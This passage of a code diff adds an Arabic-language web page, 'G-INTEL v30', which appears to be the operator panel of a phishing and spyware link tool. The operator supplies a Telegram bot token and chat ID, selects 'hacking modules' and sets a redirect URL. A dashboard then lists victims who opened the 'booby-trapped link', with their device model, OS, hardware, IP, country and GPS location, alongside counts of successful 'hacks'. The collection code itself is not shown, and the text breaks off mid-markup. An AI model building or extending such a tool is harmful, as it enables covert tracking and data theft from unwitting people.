@@ -1,0 +1,1715 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>G-INTEL · نيوترا v30 (الإصدار الذهبي)</title>
+    
+    <!-- المكتبات الأساسية -->
+    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.2/axios.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.4/moment.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.4/locale/ar.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    
+    <style>
+        /* ==================== RESET AND VARIABLES ==================== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #6366f1;
+            --primary-dark: #4f46e5;
+            --primary-light: #818cf8;
+            --secondary: #8b5cf6;
+            --accent: #ec4899;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --dark-bg: #030712;
+            --dark-surface: #111827;
+            --dark-surface-2: #1f2937;
+            --light-bg: #f9fafb;
+            --light-surface: #ffffff;
+            --light-surface-2: #f3f4f6;
+            --text-primary: #f9fafb;
+            --text-secondary: #9ca3af;
+            --border-dark: #1f2937;
+            --border-light: #e5e7eb;
+        }
+
+        body {
+            font-family: 'Inter', 'Cairo', -apple-system, BlinkMacSystemFont, sans-serif;
+            transition: background-color 0.4s cubic-bezier(0.4, 0, 0.2, 1), color 0.3s ease;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        body.dark-mode {
+            background: var(--dark-bg);
+            color: var(--text-primary);
+        }
+
+        body.light-mode {
+            background: var(--light-bg);
+            color: #111827;
+        }
+
+        /* ==================== MODERN GLASS EFFECT ==================== */
+        .glass-modern {
+            background: rgba(17, 25, 40, 0.75);
+            backdrop-filter: blur(16px) saturate(180%);
+            -webkit-backdrop-filter: blur(16px) saturate(180%);
+            border: 1px solid rgba(99, 102, 241, 0.2);
+            border-radius: 2rem;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(99, 102, 241, 0.1) inset;
+        }
+
+        .glass-modern-light {
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(16px) saturate(180%);
+            -webkit-backdrop-filter: blur(16px) saturate(180%);
+            border: 1px solid rgba(99, 102, 241, 0.3);
+            border-radius: 2rem;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.1);
+        }
+
+        /* ==================== NEO-BRUTALIST CARDS ==================== */
+        .neo-card {
+            background: linear-gradient(145deg, rgba(30, 41, 59, 0.8), rgba(15, 23, 42, 0.9));
+            border-radius: 1.5rem;
+            border: 1px solid rgba(99, 102, 241, 0.2);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .neo-card::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(circle at 30% 50%, rgba(99, 102, 241, 0.1), transparent 70%);
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+
+        .neo-card:hover {
+            transform: translateY(-4px) scale(1.01);
+            border-color: var(--primary);
+            box-shadow: 0 20px 40px -15px var(--primary);
+        }
+
+        .neo-card:hover::before {
+            opacity: 1;
+        }
+
+        /* ==================== CYBERPUNK INPUTS ==================== */
+        .cyber-input {
+            background: rgba(0, 0, 0, 0.4);
+            border: 2px solid rgba(99, 102, 241, 0.3);
+            border-radius: 1.5rem;
+            padding: 1rem 1.5rem;
+            color: inherit;
+            width: 100%;
+            transition: all 0.3s ease;
+            outline: none;
+            font-size: 1rem;
+        }
+
+        .cyber-input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.2), 0 0 30px var(--primary);
+            transform: scale(1.02);
+            background: rgba(0, 0, 0, 0.6);
+        }
+
+        .light-mode .cyber-input {
+            background: rgba(255, 255, 255, 0.8);
+            border-color: rgba(99, 102, 241, 0.4);
+        }
+
+        /* ==================== QUANTUM BUTTON ==================== */
+        .quantum-button {
+            background: linear-gradient(135deg, var(--primary), var(--secondary), var(--accent));
+            background-size: 300% auto;
+            border: none;
+            border-radius: 3rem;
+            padding: 1.2rem 2.5rem;
+            font-weight: bold;
+            font-size: 1.2rem;
+            color: white;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.4s ease;
+            box-shadow: 0 10px 30px -5px var(--primary);
+            animation: gradientShift 4s ease infinite;
+        }
+
+        @keyframes gradientShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .quantum-button::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.3), transparent 70%);
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+
+        .quantum-button:hover::before {
+            opacity: 1;
+        }
+
+        .quantum-button:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 20px 40px -5px var(--primary);
+        }
+
+        .quantum-button:active {
+            transform: translateY(0) scale(0.98);
+        }
+
+        /* ==================== NOTIFICATION SYSTEM ==================== */
+        .notification-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            max-width: 380px;
+        }
+
+        .notification-item {
+            background: var(--dark-surface);
+            border: 1px solid var(--primary);
+            border-radius: 1.2rem;
+            padding: 1rem 1.2rem;
+            box-shadow: 0 15px 30px -10px var(--primary);
+            backdrop-filter: blur(10px);
+            animation: slideInRight 0.3s ease;
+            border-right: 4px solid;
+        }
+
+        @keyframes slideInRight {
+            from { transform: translateX(100px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        /* ==================== LOADER ==================== */
+        .quantum-loader {
+            width: 80px;
+            height: 80px;
+            border: 8px solid rgba(99, 102, 241, 0.2);
+            border-top: 8px solid var(--primary);
+            border-right: 8px solid var(--secondary);
+            border-bottom: 8px solid var(--accent);
+            border-radius: 50%;
+            animation: spinQuantum 1.5s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
+        }
+
+        @keyframes spinQuantum {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ==================== BADGES ==================== */
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            padding: 0.3rem 1rem;
+            border-radius: 2rem;
+            font-size: 0.75rem;
+            font-weight: 600;
+            background: rgba(99, 102, 241, 0.1);
+            border: 1px solid var(--primary);
+            color: var(--primary);
+        }
+
+        .badge-success {
+            background: rgba(16, 185, 129, 0.1);
+            border-color: var(--success);
+            color: var(--success);
+        }
+
+        .badge-warning {
+            background: rgba(245, 158, 11, 0.1);
+            border-color: var(--warning);
+            color: var(--warning);
+        }
+
+        /* ==================== PROGRESS BAR ==================== */
+        .quantum-progress {
+            height: 8px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .quantum-progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary), var(--accent));
+            background-size: 200% auto;
+            animation: progressShimmer 2s linear infinite;
+            border-radius: 10px;
+            transition: width 0.5s ease;
+        }
+
+        @keyframes progressShimmer {
+            0% { background-position: 0% 0%; }
+            100% { background-position: 200% 0%; }
+        }
+
+        /* ==================== GRID BACKGROUND ==================== */
+        .cyber-grid {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(99, 102, 241, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(99, 102, 241, 0.03) 1px, transparent 1px);
+            background-size: 40px 40px;
+            pointer-events: none;
+            z-index: -5;
+        }
+
+        /* ==================== SCROLLBAR ==================== */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--dark-surface);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 10px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary-light);
+        }
+
+        /* ==================== DEVICE CARDS ==================== */
+        .device-card {
+            background: linear-gradient(145deg, rgba(30, 41, 59, 0.9), rgba(17, 24, 39, 0.95));
+            border-radius: 1.8rem;
+            padding: 1.5rem;
+            border: 1px solid rgba(99, 102, 241, 0.2);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .device-card::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(99, 102, 241, 0.2), transparent 70%);
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+
+        .device-card:hover::after {
+            opacity: 1;
+        }
+
+        /* ==================== ANIMATIONS ==================== */
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .animate-float {
+            animation: float 4s ease-in-out infinite;
+        }
+
+        @keyframes pulse-glow {
+            0%, 100% { box-shadow: 0 0 20px var(--primary); }
+            50% { box-shadow: 0 0 40px var(--primary); }
+        }
+
+        .glow-pulse {
+            animation: pulse-glow 2s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body :class="theme + '-mode'" class="transition-colors duration-300">
+    <div id="app" v-cloak class="relative min-h-screen w-full">
+        
+        <!-- ==================== COSMIC BACKGROUND ==================== -->
+        <div class="fixed inset-0 -z-10 overflow-hidden">
+            <div class="absolute inset-0 bg-[radial-gradient(ellipse_at_top_right,_var(--tw-gradient-stops))] from-indigo-900/20 via-transparent to-purple-900/20"></div>
+            <div class="absolute inset-0 bg-[radial-gradient(ellipse_at_bottom_left,_var(--tw-gradient-stops))] from-blue-900/20 via-transparent to-pink-900/20"></div>
+            <div class="cyber-grid"></div>
+        </div>
+
+        <!-- ==================== NOTIFICATION SYSTEM ==================== -->
+        <div class="notification-container">
+            <transition-group name="notification">
+                <div v-for="notif in notifications" :key="notif.id" 
+                    class="notification-item" 
+                    :style="{ borderRightColor: notif.color }">
+                    <div class="flex items-start gap-3">
+                        <i :class="notif.icon" class="text-xl" :style="{ color: notif.color }"></i>
+                        <div class="flex-1">
+                            <h4 class="font-bold text-sm" :style="{ color: notif.color }">{{ notif.title }}</h4>
+                            <p class="text-xs text-gray-400 mt-1">{{ notif.message }}</p>
+                            <p class="text-xs text-gray-500 mt-2">{{ notif.time }}</p>
+                        </div>
+                        <button @click="removeNotification(notif.id)" class="text-gray-500 hover:text-white">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                </div>
+            </transition-group>
+        </div>
+
+        <!-- ==================== LOADING SCREEN ==================== -->
+        <transition enter-active-class="animate__animated animate__fadeOut" leave-active-class="animate__animated animate__fadeIn">
+            <div v-if="loading" class="fixed inset-0 flex items-center justify-center bg-black/95 z-50">
+                <div class="text-center">
+                    <div class="quantum-loader mx-auto mb-8"></div>
+                    <h2 class="text-4xl font-black bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 bg-clip-text text-transparent mb-4">
+                        G-INTEL NEO
+                    </h2>
+                    <p class="text-gray-400 mb-6">{{ loadingMessage }}</p>
+                    <div class="w-80 h-2 bg-gray-800 rounded-full mx-auto overflow-hidden">
+                        <div class="quantum-progress-fill" :style="{ width: loadingProgress + '%' }"></div>
+                    </div>
+                    <div class="flex justify-between w-80 mx-auto mt-2 text-xs text-gray-600">
+                        <span>{{ loadingStage }}</span>
+                        <span>{{ loadingProgress }}%</span>
+                    </div>
+                    <div class="mt-8 flex gap-2 justify-center">
+                        <span class="badge">TECNO</span>
+                        <span class="badge">Infinix</span>
+                        <span class="badge">itel</span>
+                    </div>
+                </div>
+            </div>
+        </transition>
+
+        <!-- ==================== MAIN INTERFACE ==================== -->
+        <main v-if="!isExecuting" class="relative z-20 min-h-screen flex items-center justify-center p-4 lg:p-8">
+            <div class="w-full max-w-7xl">
+                <!-- MAIN CARD -->
+                <div class="glass-modern p-6 lg:p-10" :class="{ 'glass-modern-light': theme === 'light' }">
+                    
+                    <!-- ========== HEADER ========== -->
+                    <div class="flex flex-wrap items-center justify-between gap-6 mb-10 pb-6 border-b border-indigo-500/30">
+                        <div class="flex items-center gap-6">
+                            <div class="relative">
+                                <div class="w-20 h-20 bg-gradient-to-br from-indigo-600 via-purple-600 to-pink-600 rounded-2xl shadow-2xl flex items-center justify-center animate-float">
+                                    <i class="fas fa-crown text-4xl text-white"></i>
+                                </div>
+                                <div class="absolute -top-2 -right-2 w-5 h-5 bg-green-500 rounded-full border-2 border-white animate-pulse"></div>
+                            </div>
+                            <div>
+                                <h1 class="text-5xl lg:text-6xl font-black">
+                                    <span class="bg-gradient-to-r from-indigo-400 via-purple-400 to-pink-400 bg-clip-text text-transparent">G-INTEL</span>
+                                    <span class="text-2xl ml-2 text-indigo-400">v30</span>
+                                </h1>
+                                <div class="flex flex-wrap items-center gap-4 mt-3">
+                                    <div class="flex items-center gap-2">
+                                        <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
+                                        <span class="text-sm text-gray-400">الإصدار الذهبي</span>
+                                    </div>
+                                    <div class="flex gap-2">
+                                        <span class="badge"><i class="fas fa-database ml-1"></i>5000+ موديل</span>
+                                        <span class="badge badge-success"><i class="fas fa-check-circle ml-1"></i>دقة 99.9%</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="flex gap-3">
+                            <button @click="toggleTheme" class="w-12 h-12 rounded-full border border-indigo-500/30 flex items-center justify-center hover:bg-indigo-600/20 transition group">
+                                <i :class="theme === 'dark' ? 'fas fa-sun' : 'fas fa-moon'" class="text-indigo-400 text-xl group-hover:rotate-180 transition-transform duration-500"></i>
+                            </button>
+                            <button @click="toggleLanguage" class="px-5 py-2 rounded-full border border-indigo-500/30 text-sm hover:bg-indigo-600/20 transition flex items-center gap-2">
+                                <i class="fas fa-globe text-indigo-400"></i>
+                                <span>{{ lang === 'ar' ? 'English' : 'العربية' }}</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- ========== TABS ========== -->
+                    <div class="flex gap-2 mb-8 overflow-x-auto pb-2">
+                        <button v-for="tab in tabs" :key="tab.id" @click="activeTab = tab.id" 
+                            class="px-6 py-3 rounded-full text-sm font-medium transition-all duration-300 whitespace-nowrap flex items-center gap-2"
+                            :class="activeTab === tab.id ? 
+                                'bg-gradient-to-r from-indigo-600 to-purple-600 text-white shadow-lg shadow-indigo-500/50' : 
+                                (theme === 'dark' ? 'bg-black/30 text-gray-300 hover:bg-indigo-600/20' : 'bg-white/30 text-gray-700 hover:bg-indigo-100/50')">
+                            <i :class="tab.icon" class="text-lg"></i>
+                            <span>{{ tab.name[lang] }}</span>
+                            <span v-if="getTabBadge(tab.id)" class="ml-2 px-2 py-0.5 bg-red-500 rounded-full text-xs">{{ getTabBadge(tab.id) }}</span>
+                        </button>
+                    </div>
+
+                    <!-- ========== MAIN TAB ========== -->
+                    <div v-if="activeTab === 'main'" class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+                        <!-- Left Column -->
+                        <div class="lg:col-span-2 space-y-6">
+                            <!-- Bot Token -->
+                            <div>
+                                <label class="flex items-center gap-2 text-sm mb-2 text-gray-400">
+                                    <i class="fas fa-robot text-indigo-400"></i>
+                                    {{ lang === 'ar' ? 'توكن البوت' : 'Bot Token' }}
+                                    <span v-if="tokenValid" class="badge badge-success"><i class="fas fa-check ml-1"></i>صالح</span>
+                                    <span v-else-if="config.token" class="badge badge-warning"><i class="fas fa-exclamation ml-1"></i>غير صالح</span>
+                                </label>
+                                <div class="relative">
+                                    <i class="fas fa-key absolute right-4 top-1/2 -translate-y-1/2 text-indigo-400/70 z-10"></i>
+                                    <input type="text" v-model="config.token" @input="validateToken" 
+                                        class="cyber-input"
+                                        :class="{
+                                            'border-green-500/50': tokenValid,
+                                            'border-yellow-500/50': config.token && !tokenValid
+                                        }"
+                                        :placeholder="lang === 'ar' ? 'أدخل توكن البوت' : 'Enter bot token'">
+                                </div>
+                                <p class="text-xs text-gray-500 mt-2">
+                                    <i class="fas fa-info-circle ml-1"></i>
+                                    مثال: 7234567890:AAHxTqLgk8...
+                                </p>
+                            </div>
+
+                            <!-- Chat ID -->
+                            <div>
+                                <label class="flex items-center gap-2 text-sm mb-2 text-gray-400">
+                                    <i class="fas fa-id-card text-indigo-400"></i>
+                                    {{ lang === 'ar' ? 'معرف الدردشة' : 'Chat ID' }}
+                                </label>
+                                <div class="relative">
+                                    <i class="fas fa-hashtag absolute right-4 top-1/2 -translate-y-1/2 text-indigo-400/70 z-10"></i>
+                                    <input type="text" v-model="config.chatId" @input="validateChatId" 
+                                        class="cyber-input"
+                                        :class="{
+                                            'border-green-500/50': chatIdValid,
+                                            'border-yellow-500/50': config.chatId && !chatIdValid
+                                        }"
+                                        :placeholder="lang === 'ar' ? 'مثال: -1001234567890' : 'Example: -1001234567890'">
+                                </div>
+                                <div class="flex gap-2 mt-3">
+                                    <button @click="suggestChatId('me')" class="text-xs bg-black/30 px-4 py-2 rounded-full border border-indigo-500/30 hover:bg-indigo-600/20 transition">
+                                        <i class="fas fa-user ml-1"></i> @me
+                                    </button>
+                                    <button @click="suggestChatId('channel')" class="text-xs bg-black/30 px-4 py-2 rounded-full border border-indigo-500/30 hover:bg-indigo-600/20 transition">
+                                        <i class="fas fa-users ml-1"></i> قناة
+                                    </button>
+                                    <button @click="getChatIdFromBot" class="text-xs bg-black/30 px-4 py-2 rounded-full border border-indigo-500/30 hover:bg-indigo-600/20 transition">
+                                        <i class="fas fa-question-circle ml-1"></i> مساعدة
+                                    </button>
+                                </div>
+                            </div>
+
+                            <!-- Modules -->
+                            <div>
+                                <label class="flex items-center gap-2 text-sm mb-2 text-gray-400">
+                                    <i class="fas fa-puzzle-piece text-indigo-400"></i>
+                                    {{ lang === 'ar' ? 'وحدات الاختراق' : 'Hacking Modules' }}
+                                    <span class="badge">{{ selectedModules.length }}/{{ attackModules.length }}</span>
+                                </label>
+                                
+                                <div class="grid grid-cols-2 md:grid-cols-3 gap-2">
+                                    <div v-for="mod in attackModules" :key="mod.id" 
+                                        @click="toggleModule(mod.id)"
+                                        class="neo-card p-3 cursor-pointer transition-all duration-300 hover:scale-105 flex items-center gap-2"
+                                        :class="selectedModules.includes(mod.id) ? 'border-indigo-500' : 'opacity-70'">
+                                        <i :class="mod.icon" class="text-indigo-400"></i>
+                                        <span class="text-sm">{{ mod.name[lang] }}</span>
+                                        <i v-if="selectedModules.includes(mod.id)" class="fas fa-check-circle text-green-500 mr-auto"></i>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Redirect URL -->
+                            <div>
+                                <label class="flex items-center gap-2 text-sm mb-2 text-gray-400">
+                                    <i class="fas fa-link text-indigo-400"></i>
+                                    {{ lang === 'ar' ? 'رابط التوجيه' : 'Redirect URL' }}
+                                </label>
+                                <div class="flex gap-2">
+                                    <div class="relative flex-1">
+                                        <i class="fas fa-globe absolute right-4 top-1/2 -translate-y-1/2 text-indigo-400/70"></i>
+                                        <input type="url" v-model="config.redirectUrl" class="cyber-input" placeholder="https://example.com">
+                                    </div>
+                                    <button @click="testRedirectUrl" class="px-6 bg-black/30 border border-indigo-500/30 rounded-2xl hover:bg-indigo-600/20">
+                                        <i class="fas fa-eye text-indigo-400"></i>
+                                    </button>
+                                </div>
+                            </div>
+
+                            <!-- Advanced Settings -->
+                            <div class="grid grid-cols-2 gap-3 p-5 neo-card">
+                                <div>
+                                    <label class="text-xs text-gray-400 block mb-2">تأخير التوجيه (ث)</label>
+                                    <input type="range" v-model="extra.delay" min="0" max="30" step="0.5" class="w-full">
+                                    <div class="text-center text-indigo-400 text-sm mt-1">{{ extra.delay }} ث</div>
+                                </div>
+                                <div>
+                                    <label class="text-xs text-gray-400 block mb-2">جودة الصورة</label>
+                                    <input type="range" v-model="extra.imageQuality" min="0.1" max="1" step="0.1" class="w-full">
+                                    <div class="text-center text-indigo-400 text-sm mt-1">{{ Math.round(extra.imageQuality * 100) }}%</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Right Column -->
+                        <div class="space-y-6">
+                            <!-- Current Device -->
+                            <div class="neo-card p-6">
+                                <h3 class="font-bold mb-4 flex items-center gap-2">
+                                    <i class="fas fa-mobile-alt text-indigo-400"></i>
+                                    {{ lang === 'ar' ? 'جهازك الحالي' : 'Your Device' }}
+                                </h3>
+                                <div class="space-y-3">
+                                    <div class="flex items-center justify-between p-2 bg-black/30 rounded-xl">
+                                        <span class="text-sm text-gray-400">الموديل:</span>
+                                        <span class="text-sm font-bold text-indigo-300">{{ currentDevice.model }}</span>
+                                    </div>
+                                    <div class="flex items-center justify-between p-2 bg-black/30 rounded-xl">
+                                        <span class="text-sm text-gray-400">البراند:</span>
+                                        <span class="text-sm text-indigo-300">{{ currentDevice.brand }}</span>
+                                    </div>
+                                    <div class="flex items-center justify-between p-2 bg-black/30 rounded-xl">
+                                        <span class="text-sm text-gray-400">النظام:</span>
+                                        <span class="text-sm text-indigo-300">{{ currentDevice.os }}</span>
+                                    </div>
+                                    <div class="flex items-center justify-between p-2 bg-black/30 rounded-xl">
+                                        <span class="text-sm text-gray-400">المتصفح:</span>
+                                        <span class="text-sm text-indigo-300">{{ currentDevice.browser }}</span>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Stats -->
+                            <div class="neo-card p-6">
+                                <h3 class="font-bold mb-4 flex items-center gap-2">
+                                    <i class="fas fa-chart-pie text-indigo-400"></i>
+                                    {{ lang === 'ar' ? 'إحصائيات' : 'Stats' }}
+                                </h3>
+                                <div class="grid grid-cols-2 gap-2">
+                                    <div class="bg-black/30 p-3 rounded-xl text-center">
+                                        <div class="text-2xl font-bold text-indigo-400">{{ stats.totalHacks }}</div>
+                                        <div class="text-xs text-gray-400">اختراق</div>
+                                    </div>
+                                    <div class="bg-black/30 p-3 rounded-xl text-center">
+                                        <div class="text-2xl font-bold text-indigo-400">{{ stats.uniqueDevices }}</div>
+                                        <div class="text-xs text-gray-400">جهاز فريد</div>
+                                    </div>
+                                    <div class="bg-black/30 p-3 rounded-xl text-center">
+                                        <div class="text-2xl font-bold text-green-400">{{ stats.successCount }}</div>
+                                        <div class="text-xs text-gray-400">نجاح</div>
+                                    </div>
+                                    <div class="bg-black/30 p-3 rounded-xl text-center">
+                                        <div class="text-2xl font-bold text-indigo-400">{{ stats.successRate }}%</div>
+                                        <div class="text-xs text-gray-400">نسبة نجاح</div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Encryption -->
+                            <div class="neo-card p-6">
+                                <h3 class="font-bold mb-4 flex items-center gap-2">
+                                    <i class="fas fa-lock text-indigo-400"></i>
+                                    {{ lang === 'ar' ? 'التشفير' : 'Encryption' }}
+                                </h3>
+                                <div class="flex items-center justify-between mb-3">
+                                    <span class="text-sm text-gray-400">AES-256</span>
+                                    <label class="relative inline-flex items-center cursor-pointer">
+                                        <input type="checkbox" v-model="security.encrypt" class="sr-only peer">
+                                        <div class="w-11 h-6 bg-gray-700 rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:right-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-indigo-600"></div>
+                                    </label>
+                                </div>
+                                <div v-if="security.encrypt">
+                                    <input type="password" v-model="security.key" class="cyber-input text-sm" placeholder="مفتاح التشفير">
+                                    <p class="text-xs mt-2" :class="keyStrengthColor">{{ keyStrengthText }}</p>
+                                </div>
+                            </div>
+
+                            <!-- Progress -->
+                            <div class="neo-card p-6">
+                                <h3 class="font-bold mb-4 flex items-center gap-2">
+                                    <i class="fas fa-chart-line text-indigo-400"></i>
+                                    جاهزية الاختراق
+                                </h3>
+                                <div class="quantum-progress mb-2">
+                                    <div class="quantum-progress-fill" :style="{ width: readinessLevel + '%' }"></div>
+                                </div>
+                                <div class="flex justify-between text-sm">
+                                    <span class="text-gray-400">الحد الأدنى: 60%</span>
+                                    <span class="text-indigo-400 font-bold">{{ readinessLevel }}%</span>
+                                </div>
+                                <div class="grid grid-cols-2 gap-1 mt-3 text-xs">
+                                    <div class="flex items-center gap-1"><span :class="tokenValid ? 'text-green-500' : 'text-red-500'">●</span> التوكن</div>
+                                    <div class="flex items-center gap-1"><span :class="chatIdValid ? 'text-green-500' : 'text-red-500'">●</span> المعرف</div>
+                                    <div class="flex items-center gap-1"><span :class="selectedModules.length ? 'text-green-500' : 'text-red-500'">●</span> الوحدات</div>
+                                    <div class="flex items-center gap-1"><span class="text-green-500">●</span> الرابط</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ========== DASHBOARD TAB ========== -->
+                    <div v-if="activeTab === 'dashboard'" class="space-y-6">
+                        <div class="flex items-center justify-between">
+                            <h2 class="text-2xl font-bold flex items-center gap-2">
+                                <i class="fas fa-tachometer-alt text-indigo-400"></i>
+                                {{ lang === 'ar' ? 'لوحة التحكم' : 'Dashboard' }}
+                                <span class="badge">{{ capturedData.length }} نتيجة</span>
+                            </h2>
+                            <div class="flex gap-2">
+                                <button @click="exportAllData" class="px-4 py-2 bg-indigo-600/20 border border-indigo-500/50 rounded-xl text-sm hover:bg-indigo-600/30">
+                                    <i class="fas fa-download ml-1"></i> تصدير الكل
+                                </button>
+                                <button @click="clearAllData" class="px-4 py-2 bg-red-600/20 border border-red-500/50 rounded-xl text-sm hover:bg-red-600/30">
+                                    <i class="fas fa-trash ml-1"></i> مسح
+                                </button>
+                            </div>
+                        </div>
+
+                        <div v-if="capturedData.length === 0" class="text-center py-20 neo-card">
+                            <i class="fas fa-database text-5xl text-gray-600 mb-4"></i>
+                            <p class="text-gray-500">لا توجد نتائج اختراق بعد</p>
+                            <p class="text-sm text-gray-600 mt-2">انتظر حتى يتم فتح الرابط الملغوم</p>
+                        </div>
+
+                        <div v-else class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                            <div v-for="(data, index) in capturedData" :key="index" class="device-card">
+                                <!-- Header -->
+                                <div class="flex items-center justify-between mb-4">
+                                    <div class="flex items-center gap-2">
+                                        <i class="fas fa-skull text-2xl text-indigo-400"></i>
+                                        <div>
+                                            <h3 class="font-bold">{{ data.deviceInfo.model || 'جهاز غير معروف' }}</h3>
+                                            <p class="text-xs text-gray-500">{{ data.timestamp }}</p>
+                                        </div>
+                                    </div>
+                                    <span class="badge">#{{ index + 1 }}</span>
+                                </div>
+
+                                <!-- Device Info -->
+                                <div class="grid grid-cols-2 gap-2 mb-4">
+                                    <div class="bg-black/30 p-2 rounded-xl">
+                                        <div class="text-xs text-gray-400">البراند</div>
+                                        <div class="text-sm font-bold text-indigo-300">{{ data.deviceInfo.brand }}</div>
+                                    </div>
+                                    <div class="bg-black/30 p-2 rounded-xl">
+                                        <div class="text-xs text-gray-400">النظام</div>
+                                        <div class="text-sm text-indigo-300">{{ data.deviceInfo.os }}</div>
+                                    </div>
+                                    <div class="bg-black/30 p-2 rounded-xl">
+                                        <div class="text-xs text-gray-400">المعالج</div>
+                                        <div class="text-sm text-indigo-300">{{ data.systemInfo.cpu?.cores || '?' }} أنوية</div>
+                                    </div>
+                                    <div class="bg-black/30 p-2 rounded-xl">
+                                        <div class="text-xs text-gray-400">الذاكرة</div>
+                                        <div class="text-sm text-indigo-300">{{ data.systemInfo.ram?.total || '?' }}</div>
+                                    </div>
+                                </div>
+
+                                <!-- Network & Location -->
+                                <div class="border-t border-indigo-500/20 pt-3 mt-3">
+                                    <div class="grid grid-cols-2 gap-2 text-xs">
+                                        <div><span class="text-gray-500">IP:</span> <span class="text-indigo-300">{{ data.networkInfo.ip || '?' }}</span></div>
+                                        <div><span class="text-gray-500">البلد:</span> <span class="text-indigo-300">{{ data.networkInfo.country || '?' }}</span></div>
+                                        <div v-if="data.location" class="col-span-2">
+                                            <span class="text-gray-500">الموقع:</span>
+                                            <span class="text-indigo-300">{{ data.location.lat }}, {{ data.location.lng }}</span>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Actions -->
+                                <div class="flex gap-2 mt-4">
+                                    <button @click="viewDetails(data)" class="flex-1 bg-indigo-600/20 border border-indigo-500/50 rounded-xl py-2 text-xs hover:bg-indigo-600/30">
+                                        <i class="fas fa-eye ml-1"></i> تفاصيل
+                                    </button>
+                                    <button @click="exportSingleData(data)" class="flex-1 bg-gray-700/50 border border-gray-600 rounded-xl py-2 text-xs hover:bg-gray-600/50">
+                                        <i class="fas fa-download ml-1"></i> تصدير
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ========== LOGS TAB ========== -->
+                    <div v-if="activeTab === 'logs'" class="space-y-6">
+                        <div class="flex items-center justify-between">
+                            <h3 class="text-xl font-bold flex items-center gap-2">
+                                <i class="fas fa-history text-indigo-400"></i>
